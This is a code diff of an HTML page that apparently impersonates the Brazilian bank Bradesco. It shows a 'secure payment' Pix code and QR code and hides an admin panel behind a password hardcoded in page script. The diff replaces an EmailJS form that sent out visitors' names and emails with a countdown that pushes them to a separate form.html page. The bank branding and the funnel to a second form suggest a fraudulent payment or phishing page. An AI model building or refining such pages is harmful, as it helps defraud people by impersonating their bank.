@@ -6,58 +6,42 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 
-<!-- EmailJS -->
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-
 <style>
-body {
-    font-family: Arial;
-    background: #f4f6f9;
-    margin: 0;
-}
+body { font-family: Arial; background:#f4f6f9; margin:0;}
 
 .header {
-    background: linear-gradient(90deg, #cc092f, #a30726);
-    padding: 18px;
-    text-align: center;
+    background: linear-gradient(90deg,#cc092f,#a30726);
+    padding:18px;
+    text-align:center;
 }
-
-.logo-text {
-    color: white;
-    font-size: 26px;
-    font-weight: bold;
-}
+.logo-text { color:white; font-size:26px; font-weight:bold;}
 
 .container {
-    max-width: 400px;
-    margin: 30px auto;
-    background: white;
-    padding: 25px;
-    border-radius: 18px;
-    text-align: center;
+    max-width:400px;
+    margin:30px auto;
+    background:white;
+    padding:25px;
+    border-radius:18px;
+    text-align:center;
 }
 
 .valor {
-    font-size: 30px;
-    color: #cc092f;
-    font-weight: bold;
+    font-size:30px;
+    color:#cc092f;
+    font-weight:bold;
 }
 
 button {
-    width: 100%;
-    padding: 12px;
-    margin-top: 10px;
-    border-radius: 10px;
-    border: none;
-    background: #cc092f;
-    color: white;
+    width:100%;
+    padding:12px;
+    margin-top:10px;
+    border-radius:10px;
+    border:none;
+    background:#cc092f;
+    color:white;
 }
 
-input, textarea {
-    width: 100%;
-    margin-top: 8px;
-    padding: 10px;
-}
+textarea { width:100%; margin-top:10px; padding:10px;}
 
 .hidden { display:none; }
 </style>
@@ -69,7 +53,6 @@ input, textarea {
     <div class="logo-text">Bradesco</div>
 </div>
 
-<!-- CLIENTE -->
 <div class="container" id="cliente">
 
     <div>🔒 Pagamento Seguro</div>
@@ -84,18 +67,12 @@ input, textarea {
 
     <textarea id="codigoPix" readonly></textarea>
 
-    <h4>Já realizou o pagamento?</h4>
+    <button onclick="irFormulario()">Já fiz o pagamento</button>
 
-    <input id="nome" placeholder="Seu nome">
-    <input id="email" placeholder="Seu email">
-
-    <button onclick="enviar()">Confirmar pagamento</button>
-
-    <div id="msg"></div>
+    <div id="timer"></div>
 
 </div>
 
-<!-- ADMIN -->
 <div class="container hidden" id="admin">
     <h3>Admin</h3>
 
@@ -109,11 +86,8 @@ input, textarea {
 
 <script>
 const SENHA = "153319";
-
-/* EMAILJS INIT */
-(function(){
-    emailjs.init("SUA_PUBLIC_KEY"); // 🔴 TROCAR
-})();
+let tempo = 50;
+let countdown;
 
 /* ADMIN */
 if(location.pathname=="/admin"){
@@ -153,32 +127,31 @@ function carregar(){
     new QRCode(qr, {text:pix,width:200,height:200});
 }
 
-/* COPIAR */
+/* COPIAR + TIMER */
 function copiar(){
     navigator.clipboard.writeText(window.pix);
     alert("Copiado!");
+
+    tempo = 50;
+
+    countdown = setInterval(()=>{
+        document.getElementById("timer").innerText =
+        "Redirecionando em "+tempo+"s para confirmação...";
+
+        tempo--;
+
+        if(tempo <= 0){
+            clearInterval(countdown);
+            irFormulario();
+        }
+
+    },1000);
 }
 
-/* ENVIAR EMAIL */
-function enviar(){
-
-    let nome = document.getElementById("nome").value;
-    let email = document.getElementById("email").value;
-
-    if(!nome || !email){
-        alert("Preencha os dados");
-        return;
-    }
-
-    emailjs.send("SEU_SERVICE_ID","SEU_TEMPLATE_ID",{
-        nome: nome,
-        email: email,
-        valor: document.getElementById("valor").innerText
-    }).then(()=>{
-        msg.innerText = "Pagamento enviado para análise!";
-    },()=>{
-        msg.innerText = "Erro ao enviar!";
-    });
+/* IR PARA FORM */
+function irFormulario(){
+    let params = new URLSearchParams(location.search);
+    window.location.href = "form.html?"+params.toString();
 }
 
 carregar();
